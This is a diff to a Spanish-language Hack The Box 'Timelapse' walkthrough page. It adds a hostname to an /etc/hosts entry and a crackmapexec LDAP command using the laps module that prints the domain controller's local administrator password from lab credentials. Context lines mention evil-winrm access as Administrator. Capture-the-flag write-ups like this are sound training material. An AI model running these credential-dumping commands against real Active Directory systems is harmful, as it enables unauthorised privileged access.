@@ -168,10 +168,10 @@ PORT      STATE SERVICE
 </span><span class="az">SMB         </span><span class="p">10.10.11.152  445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)  </span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para que sepa a donde cuando le pasemos el dominio, lo agregamos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> con la ip designada<p>
+<p class="plain-text">Para que sepa a donde cuando le pasemos el dominio, lo agregamos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> con la ip designada ademas del nombre del equipo como otro<p>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ echo </span><span class="am">"10.10.11.152 timelapse.htb"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.152 timelapse.htb dc01.timelapse.htb"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Con smbclient podemos listar los recursos compartidos a nivel de smb y encontramos uno fuera de lo usual, el recurso <code class="language-plaintext highlighter-rouge">Shares</code><p>
@@ -387,6 +387,15 @@ SID               : S-1-5-21-671920749-559770252-3318990721-1000
 UserPrincipalName :
 
 PS C:\Users\svc_deploy\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Otra forma de obtener la contraseña es a traves de crackmapexec en el servicio ldap usando el modulo <code class="language-plaintext highlighter-rouge">laps</code>, esto como output nos muestra la contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">ldap timelapse.htb -u svc_deploy -p </span><span class="am">'E3R$Q62^12p7PLlC%KWaxuaV'</span><span class="p"> -M laps 
+</span><span class="az">SMB         </span><span class="p">timelapse.htb   445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+</span><span class="az">LDAP        </span><span class="p">timelapse.htb   389    DC01             </span><span class="ve">[+] </span><span class="p">timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
+</span><span class="az">LAPS        </span><span class="p">timelapse.htb   389    DC01             </span><span class="az">[*] </span><span class="p">Getting LAPS Passwords
+</span><span class="az">LAPS        </span><span class="p">timelapse.htb   389    DC01             </span><span class="am">Computer: DC01$                Password: 2mpY8H70i(28Q@B0M8r0c0cF</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Usamos la contraseña que se nos muestra para conectarnos con evil-winrm, obtenemos una shell como Administrator sin embargo no esta la flag en el escritorio</p>
